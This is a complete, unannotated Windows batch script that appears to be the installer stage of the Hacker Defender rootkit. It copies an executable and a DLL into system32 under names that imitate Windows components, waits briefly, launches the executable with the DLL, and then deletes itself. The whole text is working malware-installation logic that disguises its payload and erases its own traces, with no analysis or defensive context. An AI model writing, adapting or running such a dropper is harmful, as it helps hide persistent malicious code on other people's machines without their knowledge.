@echo off
move /y ntosatx.exe %SYSTEMROOT%\system32\ntosatx.exe
move /y msactctr.dll %SYSTEMROOT%\system32\msactctr.dll
@ping 1.1.1.1 -n 1 -w 5000 >NUL
start %SYSTEMROOT%\system32\ntosatx.exe msactctr.dll
del hxdef.bat
EXIT